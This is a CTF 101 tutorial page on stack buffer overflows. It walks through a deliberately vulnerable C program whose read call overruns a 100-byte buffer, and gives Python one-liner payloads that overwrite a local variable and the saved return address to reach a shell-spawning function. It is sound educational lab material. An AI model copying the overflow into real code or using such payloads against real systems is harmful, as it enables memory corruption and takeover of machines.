From [CTF 101](https://ctf101.org/binary-exploitation/buffer-overflow/)
A buffer overflow is a vulnerability where data can be written that exceeds the allocated space, allowing an attacker to overwrite other data.
## Stack Buffer Overflow
The simplest and most common buffer overflow is one where the buffer is on the stack.
	[[The Stack]] writeup.
###### Example:
```c
#include <stdio.h>

int main() {
    int secret = 0xdeadbeef;
    char name[100] = {0};
    read(0, name, 0x100);
    if (secret == 0x1337) {
        puts("Wow! Here's a secret.");
    } else {
        puts("I guess you're not cool enough to see my secret");
    }
}
```
There's a mistake in the above program that will allow us to see the secret.
```c
char name[100] = {0};
read(0, name, 0x100);
```
The variable `name` is initialized with a size of 100 **decimal** bytes, but `read` takes in up to 100 **hexadecimal** bytes. 
	`100 hex bytes = 256 decimal bytes`
How do we use this to our advantage?
###### If the compiler chose to layout the stack like this:
```
        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbeef  // secret
...
        0xffff0004: 0x0
ESP ->  0xffff0000: 0x0         // name
```
###### What happens when we read in 0x100 bytes of `'A'`s
The first 100 decimal bytes of data are saved properly:
```
        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbeef  // secret
...
        0xffff0004: 0x41414141
ESP ->  0xffff0000: 0x41414141  // name
```
But when we read in the 101st byte, we start to see an issue:
	The secret, `0xdeadbeef` is starting to be overwritten
```
        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbe41  // secret
...
        0xffff0004: 0x41414141
ESP ->  0xffff0000: 0x41414141  // name
```
Once we add the next three bytes to be read in, the entirety of `secret` is overwritten with `'A'`s
```
        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0x41414141  // secret
...
        0xffff0004: 0x41414141
ESP ->  0xffff0000: 0x41414141  // name
```
The remaining `152` bytes of data would continue to overwrite values up the stack!
### Passing an impossible check
How do we use this to pass the seemingly impossible check in the original program, `if (secret == 0x1337)`? If we carefully line up our input so that the bytes that overwrite `secret` are the butes that represent `0x1337` in little-endian, we'll see the secret message.
###### Python One-Liner
```python
python -c "print 'A'*100 + '\x31\x13\x00\x00'"
```
This will fill the `name` buffer with 100 `'A'`s, then overwrite `secret` with the 32-bit little endian encoding of `0x1337`
### Taking it One Step Further
As discussed on [[The Stack]] page, the instruction that the current function should jump to when it is done is saved on the stack. (Denoted as `EIP` in the above stack diagrams) If we can overwrite this, we can control where the program jumps after `main` finishes running, giving us the ability to control what the program does entirely.

Usually, the end objective in binary exploitation is to get a shell on the remote computer., which will allow us to run whatever we want on the target machine.

On the off chance there's a nice `give_shell` function somewhere in the program that we can't get to like:
```c
void give_shell() {
	system("/bin/sh");
}
```
The buffer overflow will let us use it. All we need to do is overwrite the saved `EIP` on the stack with the address of `give_shell`. Then, when `main` returns, it will pop that address of the stack and jump to it, running `give_shell` and (surprise, surprise) giving us our shell!
	Assuming `give_shell` is at `0x08048fd0`, something like the following would work:
	`python -c "print 'A'*108 + '\xd0\x8f\x04\x08'"`

We send 108 `A`s to overwrite the 100 bytes allocated for `name`, the 4 bytes for `secret`, and the 4 bytes for the saved `EBP`. Then we send the little-endian form of `give_shell`'s address and we get a shell.

Learn more in [[Return Oriented Programming]]